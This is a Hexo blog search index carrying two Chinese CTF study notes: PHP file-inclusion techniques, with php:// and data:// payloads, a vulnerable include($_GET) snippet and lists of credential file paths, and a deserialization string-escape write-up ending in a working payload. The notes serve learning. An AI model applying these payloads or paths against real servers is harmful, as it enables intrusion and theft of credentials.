<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>对于文件包含漏洞的知识梳理</title>
      <link href="/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/"/>
      <url>/2020/05/31/%E5%AF%B9%E4%BA%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>近日刷题发现对基础知识掌握有点不牢固,故逐步整理温习.今天还是先整理下文件包含漏洞.</p><p>文件包含是指:程序开发人员把经常使用代码写到一个文件里,在使用时直接调用那个文件而无需重新编写代码的过程称为文件包含.在c语言中的调用头文件和python import调用模块本质上就是一种文件包含。而文件包含漏洞（RFI）是指通过函数包含文件时，没有对包含的文件进行处理导致包含某些敏感文件或恶意文件。</p><a id="more"></a><h2 id="0x01文件包含漏洞的存在点"><a href="#0x01文件包含漏洞的存在点" class="headerlink" title="0x01文件包含漏洞的存在点"></a>0x01文件包含漏洞的存在点</h2><p>文件包含漏洞一般出现在文件系统函数的地方。比如include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file等文件系统函数。其中include、require、include_once、require_once四个函数在包含一个文件时，会执行里面的有php标记的代码。</p><p>最简单的，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'lexs'</span>]);<span class="comment">#可以控制lexs的参数内容来达到目的</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02远程文件包含"><a href="#0x02远程文件包含" class="headerlink" title="0x02远程文件包含"></a>0x02远程文件包含</h2><p>当PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include等包含函数可以加载远程文件。通常是被恶意人士用来远程包含一个恶意脚本。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen &#x3D; On (允许打开URL文件,预设启用)</span><br><span class="line">allow_url_fopen &#x3D; Off (禁止打开URL文件)</span><br><span class="line">allow_url_include &#x3D; Off (禁止引用URL文件,新版增加功能,预设关闭)</span><br><span class="line">allow_url_include &#x3D; On (允许引用URL文件,新版增加功能)</span><br></pre></td></tr></table></figure><p><img src="image-20200605165003940.png" alt="image-20200605165003940"></p><h2 id="0x03本地文件包含"><a href="#0x03本地文件包含" class="headerlink" title="0x03本地文件包含"></a>0x03本地文件包含</h2><p>本地文件包含指包含服务器上的文件。这个方法来用来读取服务器上某些文件的敏感信息或包含执行上传的恶意脚本。</p><h3 id="（1）利用目录遍历漏洞来进行文件包含"><a href="#（1）利用目录遍历漏洞来进行文件包含" class="headerlink" title="（1）利用目录遍历漏洞来进行文件包含"></a>（1）利用目录遍历漏洞来进行文件包含</h3><p>目录遍历漏洞按我理解就是通过相对路径的方式访问文件.(通过url地址中’../‘ 表上一级目录’./‘表当前目录’/‘表下一级目录).例：访问zhuce.php的上级目录下的flag.php.</p><p><img src="image-20200605212506017.png" alt="image-20200605212506017"></p><p>但要注意php配置中的include_path与open_basedir的配置：</p><h4 id="1-include-path"><a href="#1-include-path" class="headerlink" title="1.include_path"></a>1.include_path</h4><p>当寻找要包含的文件时，PHP会分别考虑包含路径中的每个条目。它将检查第一个路径，如果找不到，请检查下一个路径，直到找到包含的文件或返回警告 或错误为止 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; UNIX: &quot;&#x2F;path1:&#x2F;path2&quot;</span><br><span class="line">include_path &#x3D; &quot;.:&#x2F;php&#x2F;includes&quot;</span><br><span class="line">;在UNIX，下在包含时先找当前目录下面的文件，如果找不到找&#x2F;php&#x2F;includes目录下的文件，若再找不到则报错。</span><br><span class="line">; Windows: &quot;\path1;\path2&quot;</span><br><span class="line">include_path &#x3D; &quot;.;c:\php\includes&quot;</span><br><span class="line">;在Windows，下在包含时先找当前目录下面的文件，如果找不到找c:\php\includes目录下的文件，若再找不到则报错。</span><br></pre></td></tr></table></figure><h4 id="2-open-basedir"><a href="#2-open-basedir" class="headerlink" title="2.open_basedir"></a>2.open_basedir</h4><p>将PHP可以访问的文件限制为指定的目录树，包括文件本身。这个指令是不是由安全模式打开或者关闭的影响。在open_basedir为配置时可以用任意遍历目录但有了open_basedir的设置就能够包含设置下的目录。</p><p><img src="image-20200605221901168.png" alt="image-20200605221901168"></p><p><img src="image-20200605221707515.png" alt="image-20200605221707515"></p><h3 id="（2）利用绝对路径来进行文件包含"><a href="#（2）利用绝对路径来进行文件包含" class="headerlink" title="（2）利用绝对路径来进行文件包含"></a>（2）利用绝对路径来进行文件包含</h3><p>我们可以通过绝对路径来进行文件包含：</p><p><img src="image-20200605223232782.png" alt="image-20200605223232782"></p><p>但用绝对路径然而受到open_basedir的限制：</p><p><img src="image-20200605221551100.png" alt="image-20200605221551100"></p><p>常见的敏感信息的默认绝对路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Windows系统：</span><br><span class="line">c:\boot.ini &#x2F;&#x2F; 查看系统版本</span><br><span class="line"></span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml &#x2F;&#x2F; IIS配置文件</span><br><span class="line"></span><br><span class="line">c:\windows\repair\sam &#x2F;&#x2F; 存储Windows系统初次安装的密码</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\my.ini &#x2F;&#x2F; MySQL配置</span><br><span class="line"></span><br><span class="line">c:\ProgramFiles\mysql\data\mysql\user.MYD &#x2F;&#x2F; MySQL root密码</span><br><span class="line"></span><br><span class="line">c:\windows\php.ini &#x2F;&#x2F; php 配置信息</span><br><span class="line"></span><br><span class="line">Linux&#x2F;Unix系统：</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;shadow &#x2F;&#x2F; 账户密码文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache2默认配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;extra&#x2F;httpd-vhost.conf &#x2F;&#x2F; 虚拟网站配置</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini &#x2F;&#x2F; PHP相关配置</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf &#x2F;&#x2F; Apache配置文件</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;my.conf &#x2F;&#x2F; mysql 配置文件</span><br></pre></td></tr></table></figure><p>例如通过日志文件机制写入恶意代码,再通过绝对路径包含日志文件.</p><p>利用报错将报错的信息写入日志,再通过文件包含包含日志.</p><p><img src="image-20200606151047308.png" alt="image-20200606151047308"></p><h2 id="0x04利用php协议进行包含"><a href="#0x04利用php协议进行包含" class="headerlink" title="0x04利用php协议进行包含"></a>0x04利用php协议进行包含</h2><p>在文件包含时可以通过php协议,来绕过一些限制从而进行包含.</p><p>PHP中支持的伪协议:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">*file:&#x2F;&#x2F; — 访问本地文件系统</span><br><span class="line">http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</span><br><span class="line">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span><br><span class="line">*php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</span><br><span class="line">*zlib:&#x2F;&#x2F; — 压缩流</span><br><span class="line">*data:&#x2F;&#x2F; — 数据（RFC 2397）</span><br><span class="line">glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</span><br><span class="line">phar:&#x2F;&#x2F; — PHP 归档</span><br><span class="line">ssh2:&#x2F;&#x2F; — Secure Shell 2</span><br><span class="line">rar:&#x2F;&#x2F; — RAR</span><br><span class="line">ogg:&#x2F;&#x2F; — 音频流</span><br><span class="line">expect:&#x2F;&#x2F; — 处理交互式的流</span><br></pre></td></tr></table></figure><p>大佬总结的图如下:</p><p><img src="image-20200606151558443.png" alt="image-20200606151558443"></p><h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h4><p>file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响.</p><p>用法: file:// [文件的绝对路径和文件名]</p><p>例： file://C:/phpstudy_pro/WWW/flag.php</p><h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h4><p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p><p>(1)php://filter</p><p> php://filter与file://协议相似在双off的情况下也可以正常使用.</p><p>用法: php://filter/筛选过滤方式/resource=&lt;文件&gt;</p><p>例:php://filter/read=convert.base64-encode/resource=index.php</p><p>其中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource&#x3D;&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read&#x3D;&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write&#x3D;&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;        任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure><p>(2)php://input</p><p>php://input 是个可以访问请求的原始数据的只读流,可以读取到post没有解析的原始数据, 将post请求中的数据作为PHP代码执行。因为它不依赖于特定的 php.ini 指令。<br>ps：enctype=”multipart/form-data” 或allow_url_include=off 的时候 php://input 是无效的。</p><p>用法：php://input  (post 方式提交php代码)</p><h4 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h4><p>又称为RFC 2397 协议,data://协议在‘allow_url_fopen =on ’与v‘allow_url_include：on’<br>且php 版本大于等于 php5.2 才能生效。</p><p>用法 data://资源类型;编码,内容  （‘data://’也可以写成‘data:’）</p><p>例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?file&#x3D;data:text&#x2F;plain,&lt;?php phpinfo()?&gt;</span><br><span class="line">or</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAgcGhwaW5mbygpPz4&#x3D;</span><br></pre></td></tr></table></figure><h2 id="0x00参考资料"><a href="#0x00参考资料" class="headerlink" title="0x00参考资料"></a>0x00参考资料</h2>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于php反序列化字符逃逸的思考</title>
      <link href="/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/"/>
      <url>/2020/04/26/%E5%85%B3%E4%BA%8Ephp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8%E7%9A%84%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>php反序列化字符逃逸：指序列化的字符串是受某函数的所谓过滤处理后，字符串的某一部分会变化但描述其长度的数字没有改变.导致PHP在按该数字读取相应长度字符串后，本来属于该字符串的内容逃逸出了成为反序列化的一个属性,并成功反序列化.</p><a id="more"></a><h3 id="0x01逃逸产生的原因"><a href="#0x01逃逸产生的原因" class="headerlink" title="0x01逃逸产生的原因"></a>0x01逃逸产生的原因</h3><p>1.PHP在类进行序列化时，对类中不存在的属性也会进行反序列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class c&#123;</span><br><span class="line">    public $c&#x3D;&#39;ccc&#39;;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a&#x3D;new C;</span><br><span class="line">echo serialize($a);&#x2F;&#x2F;输出  O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;&#125;</span><br><span class="line"></span><br><span class="line">print_r(unserialize(&#39;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;&#125;&#125;&#39;));</span><br><span class="line">&#x2F;&#x2F;输出  C Object ( [c] &#x3D;&gt; C Object ( [c] &#x3D;&gt; ccc ) )</span><br><span class="line">print_r(unserialize(&#39;O:1:&quot;C&quot;:2:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:3:&quot;ccc&quot;;&#125;&#125;&#39;));</span><br><span class="line">&#x2F;&#x2F;输出C </span><br><span class="line">&#x2F;&#x2F;Object ( [c] &#x3D;&gt; ccc [b] &#x3D;&gt; C Object ( [c] &#x3D;&gt; ccc ) )</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>2.PHP进行反序列化时，是以’;’ 作为字段的分隔，以 ‘}’作为结尾(字符串除外)，并且是根据长度判断内容的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> $b=<span class="string">'B'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a=<span class="string">'this is a long  date'</span>;</span><br><span class="line">    <span class="keyword">public</span> $b=<span class="string">';s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125;'</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$a= <span class="keyword">new</span> A;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="comment">//得到的结果是：</span></span><br><span class="line"><span class="comment">//O:1:"A":2:&#123;s:1:"a";s:20:"this is a long date";s:1:"b";s:38:";s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125;";&#125;</span></span><br><span class="line">$b=unserialize($a)</span><br><span class="line">print_r($b);</span><br><span class="line"><span class="comment">//输出的是A Object ( [a] =&gt; this is a long date [b] =&gt; ;s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125; )</span></span><br></pre></td></tr></table></figure><p>可以看出<code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:20:&quot;this is a long date&quot;;s:1:&quot;b&quot;;s:38:&quot;;s:1:&quot;b&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;s:1:&quot;B&quot;;}}&quot;;}</code>反序列化出来的是一个A对象有值为‘this is a long date’的字符串属性a，和值为‘;s:1:”b”;O:1:”B”:1:{s:1:”b”;s:1:”B”;}}’字符串属性b。但如果有什么特殊的原因让反例化的值产生了变化,如:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//如果有什么特殊的原因让反例化的值产生了变化如"this is a long date"中的'is a long date‘去掉</span></span><br><span class="line">$b=<span class="string">'O:1:"A":2:&#123;s:1:"a";s:20:"this ";s:1:"b";s:38:";s:1:"b";O:1:"B":1:&#123;s:1:"b";s:1:"B";&#125;&#125;";&#125;'</span></span><br><span class="line">print_r($b);</span><br><span class="line"><span class="comment">//输出是A Object ( [a] =&gt; this ";s:1:"b";s:38: [b] =&gt; B Object ( [b] =&gt; B ) )</span></span><br><span class="line">this <span class="string">";s:1:"</span><span class="string">b";s:38:"</span>;s:<span class="number">1</span>:</span><br></pre></td></tr></table></figure><p>可以看出输出结果为一个名为A的对象有两个属性一个是值为‘’this ‘;s:1:”b”;s:38:’的字符串属性a，另一个名为B的对象(里有名为b值为B的字符串属性)。可见在我们将<code>s:20:&quot;this is a long date&quot;;s:1:&quot;b&quot;;s:38:&quot;;</code>中的”this is a long date”改成“this ”后，在反序列化，仍以20的字符串长度来反序化，同时刚好20个字符后双引号和;号，于是将”this “;s:1:”b”;s:38:”;s:1:b”当成一个字符串。同时剩下的<code>O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;s:1:&quot;B&quot;;}}</code>被当成一个对象来反序列化出来，而最后的 <code>&quot;;}</code>被忽视掉。这样就逃逸出来一个B Object。</p><h3 id="0x02例题分析"><a href="#0x02例题分析" class="headerlink" title="0x02例题分析"></a>0x02例题分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(&quot;fget.php&quot;);</span><br><span class="line">function write($data) &#123;</span><br><span class="line">    return str_replace(chr(0) . &#39;*&#39; . chr(0), &#39;\0\0\0&#39;, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function read($data) &#123;</span><br><span class="line">    return str_replace(&#39;\0\0\0&#39;, chr(0) . &#39;*&#39; . chr(0), $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class A&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    function __construct($a, $b)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $a;</span><br><span class="line">        $this-&gt;password &#x3D; $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B&#123;</span><br><span class="line">    public $b &#x3D; &#39;gqy&#39;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $c &#x3D; &#39;a&#39;.$this-&gt;b;</span><br><span class="line">        echo $c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class C&#123;</span><br><span class="line">    public $c;</span><br><span class="line">    function __toString()&#123;</span><br><span class="line">        &#x2F;&#x2F;flag.php</span><br><span class="line">        echo file_get_contents($this-&gt;c);</span><br><span class="line">        return &#39;nice&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new A($_GET[&#39;a&#39;],$_GET[&#39;b&#39;]);</span><br><span class="line">&#x2F;&#x2F;省略了存储序列化数据的过程,下面是取出来并反序列化的操作</span><br><span class="line">$b &#x3D; unserialize(read(write(serialize($a))));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>审计代码发现首先发现有三个类A、B、C。仔细分析，发现class A 有用于实例化传值的<code>__construct</code>方法。再分析类发现class C里有提示可以通过<code>__toString()</code>里file_get_contents函数读取flag。在class B，中有一个<code>__destruct()</code>里有个echo可以用来触发。发现unserialize与serialize函数发现是反序列化与序列化操作，但只能对class A进行操作。</p><p>分析完代码后，我们发现我们要想的效果是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> A();</span><br><span class="line">$b = <span class="keyword">new</span> B();</span><br><span class="line">$c = <span class="keyword">new</span> C();</span><br><span class="line">$c-&gt;c = <span class="string">"flag.php"</span>;</span><br><span class="line">$b-&gt;b = $c;</span><br><span class="line">$a-&gt;username = <span class="string">"1"</span>;</span><br><span class="line">$a-&gt;password = $b;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><p>得到一个序列化的结果:</p><p><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></p><p>但一个正常的A的对象序列化的结果为：</p><p><code>O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:1:&quot;1&quot;;}</code></p><p>但我们可以通过php反序列化字符逃逸将<code>s:8:&quot;password&quot;;s:1:&quot;1&quot;;</code>替换为<code>O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}</code>来达到我们想要的结果。</p><p>但再回到原码发现我们不是直接将序列化后的字符提交给unserialize函数。而是先将class A先实例出一个对象在将这个对象序列化，再经过write与read函数后，再提交给unserialize函数执行。我们分析write与read函数发现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), <span class="string">'\0\0\0'</span>, $data);</span><br><span class="line">    <span class="comment">//str_replace() 函数用法（要替换的字符，替换成的字符，要处理的字符串）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">'\0\0\0'</span>比, chr(<span class="number">0</span>) . <span class="string">'*'</span> . chr(<span class="number">0</span>), $data);</span><br><span class="line">    <span class="comment">//'\0\0\0'比chr(0) . '*' . chr(0)多了3个字符长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们提交的数据中用‘\0\0\0’在执行read后就少了三字符。因此我们可以构造参数$a中有多个’\0\0\0’让他执行read后多出来的字符长度用来逃逸。让php编译器将<code>&quot;;s:8:&quot;password&quot;;s:60:&quot;2</code>是username的值。即<code>$a-&gt;username=“********&quot;;s:8:&quot;password&quot;;s:60:&quot;2&quot;;</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">"username"</span>;s:<span class="number">48</span>:<span class="string">"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;s:<span class="number">74</span>:<span class="string">"2"</span>;s:<span class="number">8</span>:<span class="string">"password"</span>;O:<span class="number">1</span>:<span class="string">"B"</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">"b"</span>;O:<span class="number">1</span>:<span class="string">"C"</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">"c"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;&#125;&#125;<span class="string">";&#125;</span></span><br><span class="line"><span class="string">//得到--〉</span></span><br><span class="line"><span class="string">O:1:"</span>A<span class="string">":2:&#123;s:8:"</span>username<span class="string">";s:24:"</span>********<span class="string">";s:8:"</span>password<span class="string">";s:60:"</span><span class="number">2</span><span class="string">";O:1:"</span><span class="string">B":1:&#123;s:1:"</span><span class="string">b";O:1:"</span>C<span class="string">":1:&#123;s:1:"</span>c<span class="string">";s:8:"</span>flag.php<span class="string">";&#125;&#125;&#125;"</span>;&#125;<span class="comment">//*号附近两边有看不见的chr(0)</span></span><br></pre></td></tr></table></figure><p>所以构造payload：</p><p><code>a=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;b=2&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}</code></p><h3 id="0x00参考文献"><a href="#0x00参考文献" class="headerlink" title="0x00参考文献"></a>0x00参考文献</h3><p><a href="https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">https://www.andseclab.com/2020/01/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/</a></p><p><a href="https://jiang-niao.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/" target="_blank" rel="noopener">https://jiang-niao.github.io/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E5%9B%9B%E6%9C%88wp/</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让文件里PHP代码被服务器解析执行</title>
